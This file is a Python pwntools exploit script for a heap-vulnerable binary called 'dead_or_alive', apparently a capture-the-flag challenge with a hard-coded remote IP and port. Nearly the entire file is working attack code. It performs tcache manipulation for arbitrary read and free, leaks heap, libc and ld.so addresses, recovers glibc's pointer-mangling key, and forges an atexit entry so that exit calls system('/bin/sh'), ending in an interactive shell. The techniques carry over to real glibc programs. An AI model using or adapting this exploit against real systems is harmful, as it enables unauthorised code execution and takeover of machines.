from pwn import *

LOCAL = True
REMOTE = False
GDB = True

if REMOTE:
	LOCAL = False
	GDB = False

# Cant have GDB and non local
if(GDB == True and LOCAL == False):
	LOCAL = True

local_bin = "./dead_or_alive"

if REMOTE: 
	p = remote('94.237.56.94',48236)
if LOCAL:
	p = process(local_bin)
if GDB:
	#context.log_level = 'debug'
	gdb.attach(p.pid,''' 
	breakrva 0x19bd
	breakrva 0x152a
	c
	''')

indexer = 0

def create(bounty, desc_size, desc, alive=b"y"):
	global indexer
	p.sendlineafter(b"> ",b"1")
	p.sendlineafter(b": ",bounty) # Generating bounty amount
	p.sendlineafter(b": ",alive) # Generating alive
	p.sendlineafter(b": ",desc_size) # Generating desc size
	p.sendafter(b":",desc) # Generating desc
	indexer += 1

def delete(index):
	p.sendlineafter(b"> ",b"2")
	p.sendlineafter(b": ",index)

def view(index):
	p.sendlineafter(b"> ",b"3")
	p.sendlineafter(b": ",index)

def create_bounty_struct(ptr, size):
	return p64(ptr) + p64(0x6969) + p64(size) + p8(1) + p8(1) + p16(0)

def deobfuscate(ptr):
	mask = 0xfff << 52
	while mask:
		v = ptr & mask
		ptr ^= (v >> 12)
		mask >>= 12
	return ptr
#context.log_level = 'debug'

def arbitrary_read(ptr):
	global indexer
	idx = indexer
	create(b"1", b"32", b'Z' * 32)
	create(b"1", b"64", b'Z' * 64)
	delete(bytes(str(idx),'ascii'))
	delete(bytes(str(idx + 1),'ascii'))
	
	bounty = create_bounty_struct(ptr, 8)
	create(b"2", b"32", bounty)
	view(bytes(str(idx),'ascii'))

def arbitrary_free(ptr):
	global indexer
	idx = indexer
	create(b"1", b"32", b'Z' * 32)
	create(b"1", b"64", b'Z' * 64)
	delete(bytes(str(idx),'ascii'))
	delete(bytes(str(idx + 1),'ascii'))
	
	bounty = create_bounty_struct(ptr, 8)
	create(b"2", b"32", bounty)
	delete(bytes(str(idx),'ascii'))

create(b"6969", b"8", b"/bin/sh\x00")

# Heap leak and arb free
create(b"6969", b"32", b"A" * 32)
create(b"6969", b"64", b"A" * 64)

# Free first number 0 so we have
# 0x30 tachce -> index 0 struct chunk -> index 0 bounty chunk
delete(b"1")

# Number 1 will now change the bins
# 0x30 tcache -> index 1 struct chunk -> index 0 strut chunk -> index 0 bounty chunk
# 0x40 tcache -> index 0 bounty chunk
delete(b"2")

# This allocation will first allocate on the normal position at index 1 struct chunk
# however the bounty can be put into index 0 struct chunk

# By allocating this chunk we are able to read from index 0 struct chunk
# and also rewrite it for arbitrary read

create(b"1337", b"32", b"\x01") # idx 3

# Read index 0 chunk
view(b"3")

p.recvuntil(b"Description: ")
heap_leak = u64(p.recv(6).ljust(8,b"\x00"))

log.info("Heap leak obfuscated: " + hex(heap_leak))

# At this point we have tcache leak which is obfuscated...
heap_leak_deobfuscated = deobfuscate(heap_leak)

heap_leak_deobfuscated = (heap_leak_deobfuscated & ~0xff) | 0x10

log.info("Heap leak deobfuscated and reconstructed (LSB is predictable): " + hex(heap_leak_deobfuscated))

# We need to forge custom large chunk for unsorted bin
size = 0x460

# 0x421 just enough for unsorted bin
create(b"1337", b"96", b"\x90" * 8 + p64(size | 1)) # 4

for i in range(6):
	create(b"9999", b"96", b"\x99" * 96)

# We have to keep in mind previous size condition
create(b"1337", b"96", p64(size) + p64(0x21) + (p64(0x1337) * 4) )

# Offset to our forged chunk
# 0xc0


# Freeing forged unsorted bin chunk 
forged_heap_chunk = 0xd0 + heap_leak_deobfuscated
log.info("Forged chunk " + hex(forged_heap_chunk))
arbitrary_free(forged_heap_chunk)

#Read it back using primitive - no chunk removal or we crash later
arbitrary_read(forged_heap_chunk + 0x30)

p.recvuntil(b"Description: ")
libc_leak = u64(p.recv(6).ljust(8, b"\x00"))

log.info("Libc leak: " + hex(libc_leak))

libc = libc_leak - 0x219ce0
exit_funcs = libc + 0x219838

log.success("Libc: " + hex(libc))
log.info("exit funcs leak: " + hex(exit_funcs))

# dl_fini = decrypt(fcfc8037ded3d3d8, e9ec01ca3d530f29)
#^ 0x7fb47d48e040
rol = lambda val, r_bits, max_bits: \
    (val << r_bits%max_bits) & (2**max_bits-1) | \
    ((val & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))

# Rotate right: 0b1001 --> 0b1100
ror = lambda val, r_bits, max_bits: \
    ((val & (2**max_bits-1)) >> r_bits%max_bits) | \
    (val << (max_bits-(r_bits%max_bits)) & (2**max_bits-1))


# encrypt a function pointer
def encrypt(v, key):
    return p64(rol(v ^ key, 0x11, 64))

exit_handlers_first_func = libc + 0x21af18
log.info("exit_handlers_first_func: " + hex(exit_handlers_first_func))

ld_leak_got = libc + 0x219010
log.info("ld_leak_got: " + hex(ld_leak_got))

arbitrary_read(ld_leak_got)

p.recvuntil(b"Description: ")
ld_leak = u64(p.recv(6).ljust(8, b"\x00"))

ld_so = ld_leak - 0x15d30
log.info("ld_so: " + hex(ld_so))

dl_fini = ld_so + 0x6040
log.info("dl_fini: " + hex(dl_fini))

arbitrary_read(exit_handlers_first_func)

p.recvuntil(b"Description: ")
dl_fini_encrypted = u64(p.recv(8).ljust(8, b"\x00"))

# Get key with the leaked dl_fini encrypted pointer
key = ror(dl_fini_encrypted, 0x11, 64) ^ dl_fini

log.success("ASLR Pointer encryption key: " + hex(key))
log.info("Check for correctness: " + hex(u64(encrypt(dl_fini, key))))

system = libc + 0x50d60
log.info("System: " + hex(system))

bin_sh_chunk = heap_leak_deobfuscated - 0x40
#############  next | count  | type (cxa) | addr                             | arg               | not used
atexit_array_entry = p64(0) + p64(1) + p64(4)     + encrypt(system, key) + p64(bin_sh_chunk) + p64(0)

atexit_forged_ptr = heap_leak_deobfuscated + 0x1c0
log.info("Forged atexit entry: " + hex(atexit_forged_ptr))

create(b"2", b"56", atexit_array_entry)

cur_index = indexer
create(b"5", b"96" ,b"A" * 24 + p64(0x31) + b"O" * 16)
delete(bytes(str(cur_index),'ascii'))

# Constructing double free and arb write
# we can overwrite tcache pointer

freed_chunk = heap_leak_deobfuscated + 0x1f0 + 0x60
log.info("Double free for arb write chunk: " + hex(freed_chunk))

arbitrary_free(freed_chunk)

obfuscated_pointer_exit_funcs = (exit_funcs - 8) ^ (heap_leak_deobfuscated >> 12)
create(b"9", b"96", b"A" * 24 + p64(0x31) + p64(obfuscated_pointer_exit_funcs) + b"\x00" * 16)

repair_language_bs = libc + 0x1dd1a8

# arb write
create(b"16", b"32", p64(repair_language_bs) + p64(atexit_forged_ptr))

# Deplete all entries -> force exit
while(True):
	if(indexer == 50):
		break

	create(b"1337", b"16", p64(0xdeadbeef))

p.sendlineafter(b"> ",b"1")

p.interactive()

